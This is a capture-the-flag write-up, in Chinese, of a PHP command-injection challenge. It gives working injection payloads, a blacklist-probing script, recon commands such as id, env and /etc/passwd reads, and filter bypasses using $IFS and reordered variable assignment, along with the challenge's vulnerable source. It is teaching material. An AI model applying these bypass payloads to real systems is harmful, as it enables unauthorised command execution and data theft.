# CTF Web 命令注入题（正则绕过）解题记录

题目地址: http://9a9db6a12a1156c417c4db73.http-ctf2.dasctf.com:80

Flag: `CTF2{1e264fd8-5d79-41ef-8b9b-f048cac75e0c}`

**核心考点：OS 命令注入 + 字符黑名单 + 用「赋值顺序」骗过正则过滤器**

---

## 零、快速答案

```
/?ip=;b=lag.php;a=f;cat$IFS$a$b
```

返回：

```php
<?php
$flag = "CTF2{1e264fd8-5d79-41ef-8b9b-f048cac75e0c}";
?>
```

一句话原理：过滤器禁止输入中出现 `f.*l.*a.*g`（f 后面任意位置有 l、l 后面任意位置有 a、a 后面任意位置有 g）。
把 `lag.php` 的赋值写在前面、把 `f` 的赋值写在**最后**，输入文本里唯一的 `f` 后面就不再出现 `l`，正则失配 → 放行。
而 shell 运行时才做变量展开，最终执行的是 `cat flag.php`。
空格用 `$IFS` 顶替。

---

## 一、识别漏洞类型

### 1.1 观察到的现象

首页正文只有 6 个字节：

```
/?ip=
```

响应头里有一行关键信息：

```
X-Powered-By: PHP/5.6.40
```

- `/?ip=` 是出题人留的**提示**：输入点是 URL 的 `ip` 查询参数
- `X-Powered-By: PHP/5.6.40` 说明后端是 PHP 5.6（老版本，常见于 CTF 环境）

### 1.2 什么是 OS 命令注入

网站常有「ping 测试」功能——你输入一个 IP，服务器帮你 ping 一下并回显结果。**用 shell 实现时大概是这样**：

```php
$ip = $_GET['ip'];
echo shell_exec("ping -c 4 " . $ip);   // ← 问题出在这
```

`$ip` 被**直接字符串拼接进了一条 shell 命令**。而 shell 语法里很多符号有特殊含义，
攻击者可以通过它们「跳出」原本的参数位置，塞进属于自己的命令。

这就是 **OS 命令注入（OS Command Injection）**。

经典出现位置：ping、nslookup/dig、ffmpeg、convert、git、tar、curl/wget 的参数、文件上传/解压。

### 1.3 怎么判断「可能」有注入

| 信号 | 说明 |
|---|---|
| 输入被拼进系统命令并回显结果 | 输出里出现命令执行痕迹 |
| 输出格式「不像网页」 | 例如 `PING 1.1.1.1 (1.1.1.1): 56 data bytes` |
| 存在可试探点 | `id` / `whoami` / `env` |

**不要一上来就 `cat /etc/passwd`。** 正确顺序：确认注入 → 侦察环境 → 针对过滤器定制 payload。

---

## 二、确认注入存在

```
/?ip=;id          → uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
/?ip=|id          → 同上
/?ip=;whoami      → www-data
```

`;` 和 `|` 都能用 → **注入成立**。

**输出解读：**

- `uid=82(www-data)`：Web 服务以 `www-data` 身份运行
- `groups=...,82(www-data)`：没有 root 组，**没提权**，别走这条捷径
- 前面有 `<pre>`：说明是 `shell_exec` 的结果被放进 `<pre>` 标签

> `;` = 一条命令结束、下一条开始（命令分隔符）
> `|` = 管道，左边 stdout 接到右边 stdin
> 这两个是最常用的注入分隔符

---

## 三、侦察目标机器

动手前先花两三条请求搞清楚「我在哪、有啥、怎么过滤」。

```
/?ip=;pwd
```
```
/var/www/html          ← 当前目录 = 网站根目录
```

```
/?ip=;ls
```
```
flag.php
index.php
```

**关键发现：flag 就在同目录的 `flag.php` 里，而且我在这个目录，不需要用 `/`。**
这一条直接决定了后面所有 payload 的写法（不用绝对路径，绕开了 `/` 被禁的限制）。

```
/?ip=;ls$IFS-la
```
```
total 8
-rwxr-xr-x 1 www-data www-data  66 Sep 26 15:21 flag.php
-rwxr-xr-x 1 www-data www-data 574 Dec 25  2019 index.php
```

> 这里 `$IFS` 是空格占位符（写真空格会被拦），第四、五章详细解释。

```
/?ip=;env
```
```
FLAG=not_flag          ← 假 flag，诱饵，别上当
HOSTNAME=ctf-target-9a9db6a18c954d1d8b2f5ce4cf3f6a88
PWD=/var/www/html
```

`env` 打印所有环境变量，是很好的信息收集命令。

**侦察结论：目标是读取 `/var/www/html/flag.php` 的内容。**

---

## 四、核心：逆向出过滤器（本题真正的难点）

出题人写了 **4 层过滤**，需要一层层拆掉。

### 4.1 方法论：黑盒探测字符表

**思路：不要猜，把黑名单「测」出来。**

方法：构造探针 `;ZZ{c}ZZ`，`{c}` 是待测字符（URL 编码）。
如果响应出现拒绝信息，说明该字符被禁。
用 `ZZ` 包起来是为了保证即使字符合法，探针也只是一个无害的、不存在的命令。

```powershell
$chars=@('%20','%09','%0a','%0d','%3c','%3e','%26','%27','%22','%60','%24',
         '%28','%29','%7c','%3b','%2a','%3f','%23','%21','%7e','%7b','%7d',
         '%5b','%5d','%5c','%2c','%3a','%5e','%2b','%2d','%2e','%25','%40','%3d')
foreach($c in $chars){
  $r = curl.exe -s "http://目标/?ip=;ZZ$cZZ"
  if($r -match 'fxck'){ "$c -> BLOCKED" } else { "$c -> ok" }
}
```

实测结果：

| 🚫 被禁 | ✅ 可用 |
|---|---|
| ` ` 空格 | `` ` `` 反引号 |
| `\t` Tab | `$` |
| `\n` 换行 | `(` |
| `\r` 回车 | `|` |
| `<` `>` | `;` |
| `&` | `#` `!` `~` |
| `'` `"` | `\` |
| `(` `)` | `,` `:` `^` `+` `-` `.` |
| `*` `?` | `%` `@` `=` |
| `{` `}` `[` `]` | |
| `/` 斜杠 | |

**这张表就是攻击面的地图。** 直接推出几个重要结论：

- 不能用 `/` → 无法用绝对路径（幸好 flag 就在当前目录）
- 不能用 `<` `>` → 无法做输入输出重定向（`cmd < file`、`cmd > file`）
- 不能用 `*` `?` `[` `]` → **无法用通配符**（这是绕过 flag 检查的常用手段，这里被堵死了）
- 不能用引号 → 无法用 `$(...)`、无法给 `php -r` 传字符串
- 但 `$`、`` ` ``、`(`、`;` 开放 → 变量展开和命令替换还能用

### 4.2 定位「flag 拦截」规则

随便试：

```
/?ip=;cat$IFSflag.php    →  fxck your flag!
/?ip=;echo$IFSflag      →  fxck your flag!
```

**注意：拒绝信息是 `fxck your flag!`，和符号黑名单的 `1fxck your symbol!` 不是同一条规则。**
说明存在一条**专门针对 flag 的规则**。

#### 第一步：定位是哪个关键词

```
/?ip=;fla            → EMPTY（没触发）
/?ip=;fla;id         → 正常执行
/?ip=;x=fla;id       → 正常执行
/?ip=;x=fla;y=g;id   → fxck your flag!    ← 注意这里没有连续的 "flag"
/?ip=;x=f;y=l;z=a;w=g;id → fxck your flag!
```

`x=fla;y=g` 里根本没有连续的 "flag" 四个字，却依然被拦。
说明规则不是简单子串匹配，而是**允许中间夹东西**的模式 → 正则 `f.*l.*a.*g`。

- `.` = 任意一个字符
- `*` = 零个或多个

#### 第二步：测出量词的范围（间隔实验）

在 f、l、a、g 之间塞 N 个 `z`，看多久才不再被拦：

```
/?ip=;fZZZZZlZZZZZaZZZZZg;id
```

| 间隔 N | 0 | 1 | 2 | 4 | 8 | 16 | 24 | 32 | 40 |
|---|---|---|---|---|---|---|---|---|---|
| 结果 | 拦 | 拦 | 拦 | 拦 | 拦 | 拦 | 拦 | 拦 | 拦 |

**全部被拦 → `.*` 是无长度限制的。** 规则确认：`f.*l.*a.*g`。

> 这一步很关键：如果量词是 `{0,3}`，那用 4 个字符的变量名就能绕开；
> 如果是无限制，就必须**改变字符顺序**才能绕过。方向完全不一样。

#### 第三步：用所有现象交叉验证

| 输入 | 字母数字流 | 有 f→l→a→g 吗 | 实测 |
|---|---|---|---|
| `;fla;id` | `flaid` | f、l、a 有了，**没有 g** | 放行 ✅ |
| `;x=fla;y=g;id` | `xflaygid` | f(1)→l(2)→a(3)→g(6) | 拦截 ✅ |
| `;x=f;y=l;z=a;w=g;id` | `xfylzawgid` | 各间隔 3 字符，仍匹配 | 拦截 ✅ |
| `;ls$IFS-l` | `lsIFSl` | F 后面没有 l | 放行 ✅ |
| `;cat$IFSindex.php` | `catIFSindexphp` | F 后面没有 l | 放行 ✅ |

全部对上了。

> 顺便验证大小写：`/?ip=;f;echo$IFS-ZZLAG` → 正常输出 `-ZZLAG`，
> 说明只有**小写** f/l/a/g 才触发（正则区分大小写）。

### 4.3 绕过 flag 正则 —— 关键技巧：调整赋值顺序

问题变成：**我必须让 shell 最终执行 `cat flag.php`，但发过去的字符串里不能出现 f→l→a→g 的顺序。**

决定性认知：

> **过滤发生在「发送时」，变量展开发生在「运行时」。**
> PHP 只检查你发过去的**原始字符串**。而 `$b` 在 shell 里才展开成 `lag.php`。
> 所以，**你发送的文本**和**shell 实际执行的命令**可以是完全不同的东西。

第一个直觉尝试（**失败了**）：

```
/?ip=;a=f;b=lag.php;cat$IFS$a$b
```

字母流：`a f b l a g p h p ...` → f(1) → l(3) → a(4) → g(5)，**命中拦截**。
因为 `a=f` 写在了前面。

**破解：把含 l、a、g 的赋值放前面，把 f 放最后。**

```
/?ip=;b=lag.php;a=f;cat$IFS$a$b
```

字母流：`b l a g p h p a f c a t I F S a b`

- 唯一的 `f` 在位置 8
- 位置 8 之后**没有 l**
- → `f.*l.*a.*g` 匹配失败 → **放行** ✅

而 shell 执行时：

- `b=lag.php` → `b` = `lag.php`
- `a=f` → `a` = `f`
- `cat$IFS$a$b` → `cat` `flag.php`

**同一个 URL，两份完全不同的文本。这就是这道题的全部考点。**

---

## 五、解决空格问题

flag 拦截搞定了，但空格被禁（源码里的规则是 `preg_match("/ /")` → `fxck your space!`）。
`cat flag.php` 需要一个空格，怎么绕过？

### 5.1 用 `$IFS` 顶替空格

```
/?ip=;ls$IFS..
```
```
html
localhost          ← 列出了父目录 /var/www，证明命令真的是 `ls ..`
```

**原理（基础但重要）：**

`IFS` 是 shell 内置变量，叫 **Internal Field Separator（内部字段分隔符）**，
默认值是 **空格 + Tab + 换行** 三个字符。

POSIX shell 里，**未加引号的变量展开结果会经过「单词切分」（word splitting）**：
如果展开内容里含有 IFS 中的字符，就在那里切开，变成多个独立参数。

```
cat$IFS/etc/passwd
     ↑ 展开成 " \t\n"，全是 IFS 空白字符
```

→ 切分出一个分隔符 → shell 理解为 `cat` 和 `/etc/passwd` **两个参数** → 等价于 `cat /etc/passwd`

### 5.2 一个必须知道的坑：变量名是「贪婪」的

排查时踩过这个坑，非常值得单独讲。

```
/?ip=;cat$IFSflag.php
```

我以为这会展开成 `cat flag.php`，**错！**

shell 解析 `$IFSflag` 时，会从 `$` 后面开始，**贪婪地**把连续的「合法变量名字符」
（字母、数字、下划线）全部吞掉，变成变量名 `IFSflag`。而 `IFSflag` 不存在 → 展开成空字符串。

结果整个词变成 `cat.php` → 文件不存在 → **什么都没输出**。

**实验证明：**

```
/?ip=;echo$IFS$UNSETXYZZZ   →  空      （$UNSETXYZZZ 是一个变量名，不是 $UNSET + XYZZZ）
/?ip=;echo$IFSZZLAG        →  空      （同理）
/?ip=;ls$IFS..             →  成功     （. 不是合法变量名字符，$IFS 正常结束）
/?ip=;ls$IFS-l             →  成功     （- 也不是合法变量名字符）
```

**规则：`$` 后面紧跟的合法变量名会被贪心吃掉。所以 `$IFS` 后面想接字母变量，必须用另一个 `$` 明确断开：**

```
cat$IFS$a$b      ✅  cat + 空格 + a的值 + b的值（a、b 的值连成一个词）
cat$IFS$a$IFS$b  ❌  cat + 空格 + a的值 + 空格 + b的值（变成 3 个参数！）
```

这就是为什么早期把 `cat$IFSindex.php` 误判为「输出被过滤了」——
其实是**命令根本没执行成功**。用 `;a=index.php;cat$IFS$a` 就能正常读到源码。

### 5.3 另一个坑：注意输出通道

`index.php` 用的是 `shell_exec()`，它**只捕获标准输出（stdout），不捕获标准错误（stderr）**。

所以命令失败时的报错（`cat: f: No such file or directory`）**根本看不到**，
只能看到「输出为空」。排查时极易被误导。

**「空输出」≠「没执行」。** 需要用 `wc`、`ls` 这类能自证存在的命令交叉验证：

```
/?ip=;a=index.php;wc$IFS$a     →  0 0 0        ← wc 对不存在的文件也是输出 0 0 0（报错在 stderr）
/?ip=;a=index.php;ls$IFS-l$IFS$a  →  空        ← ls 不到说明文件真的打不开
```

对比：把 `;a=f;b=lag.php;cat$IFS$a$IFS$b`（错误地多加一个 `$IFS`）就会失败，
因为它变成了 `cat f lag.php` —— 三个独立参数，两个文件都不存在。

---

## 六、最终利用

```
/?ip=;b=lag.php;a=f;cat$IFS$a$b
```

**逐段拆解：**

| 片段 | 作用 | 发出的文本 | 运行时展开 |
|---|---|---|---|
| `;` | 结束前面的 ping | — | — |
| `b=lag.php` | 赋值（无输出） | `b`,`l`,`a`,`g`… | `b` = `lag.php` |
| `;` | 命令分隔 | — | — |
| `a=f` | 赋值（唯一的 f 放最后） | `a`,`f` | `a` = `f` |
| `;` | 命令分隔 | — | — |
| `cat$IFS$a$b` | 读文件 | `cat`,`IFS`,`a`,`b` | `cat flag.php` |

**发送的文本**：`;b=lag.php;a=f;cat$IFS$a$b`
→ 字母流 `blaghpafcatIFS ab` → 唯一的 f 后面没有 l → 4 层过滤全部放行

**实际执行**：`cat flag.php`

**响应：**

```php
<?php
$flag = "CTF2{1e264fd8-5d79-41ef-8b9b-f048cac75e0c}";
?>
```

> 附：读源码（不需要，源码里也没 flag）：`/?ip=;a=index.php;cat$IFS$a`

---

## 七、源码：出题人到底写了什么

`;a=index.php;cat$IFS$a` 拿到的完整源码：

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

（`<?php` 上面还有一行纯文本 `/?ip=`，就是出题人留的提示。）

**逐条对应黑盒测出来的结论：**

| 代码 | 作用 |
|---|---|
| `/[...]/` | 第 1 层：符号黑名单 —— 拦 `/ * ? < > ' " \ ( ) [ ] { }` 和控制字符 `0x00-0x1F`（含 Tab/换行） |
| `preg_match("/ /")` | 第 2 层：拦字面空格 |
| `preg_match("/bash/")` | 第 3 层：拦 `bash` 字样（防止换成 bash 语法） |
| `preg_match("/.*f.*l.*a.*g.*/")` | **第 4 层：拦 flag —— 黑盒逆向出来的正是这一条** |
| `shell_exec("ping -c 4 ".$ip)` | 漏洞本体：直接拼接执行 |
| `print_r($a)` | 回显结果（`print_r` 对字符串等于原样输出） |

**顺便解释那个莫名的「1fxck your symbol!」**：
第 1 层里 `echo preg_match(...)` 会在 `die()` 之前先输出 `1`（匹配成功）或 `0`（不匹配），
所以消息变成了 `1fxck your symbol!`。这是出题人的小失误，反而帮了忙：
**可以靠这个 `1`/`0` 精确判断规则到底匹没匹配到。**

---

## 八、基础知识清单

### Web / PHP

| 知识点 | 说明 |
|---|---|
| `$_GET['ip']` | PHP 读取 URL 查询参数 `?ip=xxx` |
| `shell_exec()` / `system()` | 执行 shell 命令。`system()` 直接打印，`shell_exec()` 返回字符串 |
| **stdout vs stderr** | `shell_exec` 只收 stdout，所以看不到报错，失败表现为「空输出」 |
| `preg_match($pattern, $subject)` | PHP 正则匹配，命中返回 1，否则 0 |
| `die($str)` | 输出并立即终止脚本 |
| `print_r()` | 打印变量；传字符串时等于原样输出 |
| `X-Powered-By` 响应头 | 泄露后端语言和版本 |

### Shell

| 符号 | 含义 | 本题可用 |
|---|---|---|
| `;` | 命令分隔符，右侧是新命令 | ✅ |
| `\|` | 管道，左边 stdout 接到右边 stdin | ✅ |
| `&&` `\|\|` `&` | 逻辑与/或、后台 | `&` 被禁 |
| `` ` ` `` | 命令替换（旧语法） | ✅ |
| `$var` | 取变量值 | ✅ |
| `${var}` | 带花括号取变量 | ❌ `{}` 被禁 |
| `x=val` | 赋值（无输出） | ✅ |
| `$IFS` | 内部字段分隔符，默认「空格+Tab+换行」，用于替代空格 | ✅ |
| 单词切分 | 未加引号的展开结果按 IFS 切开成多个参数 | — |
| 变量名贪婪 | `$IFSflag` 是变量 `IFSflag`，不是 `$IFS` + `flag` | ⚠️ 关键坑 |
| `>` `<` | 重定向 | ❌ |
| `*` `?` `[..]` | 通配符 / 字符类 | ❌ |
| `/` | 路径分隔符 | ❌ |
| `'` `"` | 引号 | ❌ |

### 绕过思路

| 技巧 | 说明 |
|---|---|
| **顺序颠倒** | 过滤按字面顺序匹配，把关键字符放到后面即可错开。**本题核心** |
| **`$IFS`** | 顶替被禁的空格 |
| **变量拼接** | `$a$b` 相邻展开可拼出任意字符串，而发送的文本里看不到目标内容 |
| **命令替换** | `` `printf f` `` 把字符「算」出来（本例因内部需要空格而不可用） |

---

## 九、可迁移的方法论

遇到「有过滤的命令注入」按这个顺序走，别跳步：

1. **确认漏洞** — `;id`、`|id`、`&&id`。有回显最好，没回显就找时间盲注。
2. **侦察环境** — `pwd`、`ls -la`、`env`、`whoami`、`uname -a`。
   确定 flag 位置，决定要不要用绝对路径。
3. **黑盒测绘字符表** — 用 `ZZ{c}ZZ` 探针批量测。
   **这一步是所有绕过的基础**，因为它决定了你能用什么语法。
4. **区分不同的拒绝层** — 不同的错误消息 = 不同的规则。
   本题 `fxck your symbol!` 和 `fxck your flag!` 明显是两条独立规则，逐条击破。
5. **正则规则要「测边界」** — 遇到疑似正则，插 N 个填充字符扫一遍，
   测出量词是 `?` `*` `+` 还是 `{n,m}`。这一步直接决定解法方向。
6. **抓住「检查时机 vs 执行时机」的错位** — 过滤器看的是你**发过去**的字节，
   shell 看的是**展开后**的命令。所有基于「检查与执行不一致」的绕过都源于此。
7. **区分「空输出」和「被拦」** — 本题两次被这个坑误导。
   stderr 不可见时，用 `wc`、`ls` 等能自证的命令交叉验证。
8. **拿到 flag 后回头读源码** — 源码能让解题报告从「推测」变成「确证」，也是最好的学习材料。

---

## 十、完整请求/响应速查

```
# 1. 确认注入
GET /?ip=;id
→ uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)

# 2. 侦察
GET /?ip=;pwd                      → /var/www/html
GET /?ip=;ls                       → flag.php  index.php
GET /?ip=;ls$IFS-la                → flag.php(66B)  index.php(574B)
GET /?ip=;env                      → FLAG=not_flag（诱饵）

# 3. 探黑名单（把 c 换成 %20 %2f %2a ... 循环）
GET /?ip=;ZZ{c}ZZ                  → 命中则 1fxck your symbol!

# 4. 定位 flag 规则
GET /?ip=;x=fla;y=g;id             → fxck your flag!   （证明不是子串匹配）
GET /?ip=;f{'z'×40}l{'z'×40}a{'z'×40}g;id → fxck your flag! （证明 .* 无限制）

# 5. 取 flag
GET /?ip=;b=lag.php;a=f;cat$IFS$a$b
→ $flag = "CTF2{1e264fd8-5d79-41ef-8b9b-f048cac75e0c}";

# 6. 读源码（确证过滤器规则）
GET /?ip=;a=index.php;cat$IFS$a
```

---

**最终答案：`CTF2{1e264fd8-5d79-41ef-8b9b-f048cac75e0c}`**
